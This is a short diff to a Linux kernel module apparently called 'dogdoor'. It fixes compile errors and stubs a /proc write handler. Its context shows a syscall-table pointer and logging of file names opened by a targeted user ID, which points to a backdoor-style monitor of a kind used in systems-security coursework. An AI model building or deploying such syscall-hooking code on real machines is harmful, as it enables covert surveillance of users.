@@ -13,10 +13,10 @@
 #include <asm/unistd.h>
 #include <asm/segment.h>
 #include <asm/uaccess.h>
+#define FILENAME_COUNT 10
 
 MODULE_LICENSE("GPL");
 
-#define FILENAME_COUNT 10;
 
 char user_uid[128] = "-1";
 void ** sctable ;
@@ -81,7 +81,8 @@ int file_sync(struct file *file)
     return 0;
 }
 
-void print_filenames() {
+static
+void print_filenames(void) {
     int i;
     for (i=0; i<FILENAME_COUNT; i++) {
         if (accessed_filenames[i] != NULL) {
@@ -90,7 +91,8 @@ void print_filenames() {
     }
 }
 
-void init_filenames(const char __user * filename) {
+static
+void init_filenames(char __user * filename) {
     if (count_accessed_filenames < 10) {
         accessed_filenames[count_accessed_filenames] = filename;
         count_accessed_filenames++;
@@ -129,6 +131,7 @@ static
 ssize_t dogdoor_log_proc_read(struct file *file, char __user *ubuf, size_t size, loff_t *offset) 
 {
 	ssize_t toread ;
+    int i;
 
     for(i=0; i<FILENAME_COUNT; i++) {
         if (accessed_filenames[i] != NULL){
@@ -162,16 +165,7 @@ ssize_t dogdoor_proc_read(struct file *file, char __user *ubuf, size_t size, lof
 }
 
 static 
-ssize_t dogdoor_log_proc_write(struct file *file, const char __user *ubuf, size_t size, loff_t *offset) 
-{
-	if (*offset != 0 || size > 128)
-		return -EFAULT ;
-
-	if (copy_from_user(buf, ubuf, size))
-		return -EFAULT ;
-
-	return *offset ;
-}
+ssize_t dogdoor_log_proc_write(struct file *file, const char __user *ubuf, size_t size, loff_t *offset) { return 0 ; }
 
 static 
 ssize_t dogdoor_proc_write(struct file *file, const char __user *ubuf, size_t size, loff_t *offset) 
